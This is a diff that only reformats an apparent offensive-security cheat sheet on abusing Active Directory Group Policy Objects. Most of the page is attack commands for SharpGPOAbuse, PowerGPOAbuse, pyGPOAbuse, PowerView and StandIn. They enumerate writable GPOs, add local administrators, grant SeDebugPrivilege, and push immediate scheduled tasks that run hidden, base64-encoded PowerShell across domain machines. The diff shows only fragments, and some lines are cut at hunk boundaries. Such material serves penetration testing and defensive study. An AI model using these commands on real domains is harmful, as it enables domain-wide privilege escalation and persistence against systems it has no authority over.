@@ -1,9 +1,9 @@
-# Group Policy Objects GPO
+# Group Policy Objects (GPOs)
 
 Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner.
 
 {% hint style="warning" %}
-GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local
+GPO Priorization : Organization Unit > Domain > Site > Local
 {% endhint %}
 
 #### GPO are stored in the DC in `\\<domain.dns>\SYSVOL\<domain.dns>\Policies\<GPOName>\`, inside two folders **User** and **Machine**. If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at `Machine\Preferences\ScheduledTasks`.
@@ -16,13 +16,13 @@ Domain members refresh group policy settings every 90 minutes by default but it 
 
 Look a GPLink where you have the **Write** right.
 
-```text
+```
 Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
 ```
 
 **Abuse GPO with SharpGPOAbuse**
 
-```text
+```
 # Build and configure SharpGPOAbuse
 git clone https://github.com/FSecureLABS/SharpGPOAbuse
 Install-Package CommandLineParser -Version 1.9.3.15
@@ -43,9 +43,9 @@ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\Co
 .\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
 ```
 
-**Abuse GPO with**[ **PowerGPOAbuse**](https://github.com/rootSySdk/PowerGPOAbuse)\*\*\*\*
+**Abuse GPO with**[** PowerGPOAbuse**](https://github.com/rootSySdk/PowerGPOAbuse)****
 
-```text
+```
 PS> . .\PowerGPOAbuse.ps1
 
 # Adding a localadmin 
@@ -63,7 +63,7 @@ PS> Add-UserTask/Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe 
 
 **Abuse GPO with pyGPOAbuse**
 
-```text
+```
 git clone https://github.com/Hackndo/pyGPOAbuse
 
 # Add john user to local administrators group (Password: H4x00r123..)
@@ -80,7 +80,7 @@ git clone https://github.com/Hackndo/pyGPOAbuse
 
 **Abuse GPO with PowerView**
 
-```text
+```
 # Enumerate GPO
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
 
@@ -90,7 +90,7 @@ New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArgumen
 
 **Abuse GPO with StandIn**
 
-```text
+```
 # Add a local administrator
 StandIn.exe --gpo --filter Shards --localadmin user002
 
@@ -101,9 +101,7 @@ StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivil
 StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
 ```
 
-\*\*\*\*
-
-
+****
 
 
 
